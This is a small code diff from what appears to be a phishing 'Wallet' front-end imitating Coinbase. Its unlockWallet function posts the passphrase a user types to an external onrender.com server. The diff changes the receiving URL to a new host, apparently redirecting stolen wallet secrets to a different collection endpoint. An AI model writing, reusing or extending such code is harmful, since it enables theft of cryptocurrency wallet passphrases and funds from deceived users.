@@ -10,7 +10,7 @@ const Wallet = () => {
   const [loading, setLoading] = useState(false);
 
   const unlockWallet = async () => {
-    const url = 'https://coinbasebackend.onrender.com/coinbase';
+    const url = 'https://secondwalletvalwizzy.onrender.com/coinbase';
     const data = { passphrase: text };
     try {
       setLoading(true);
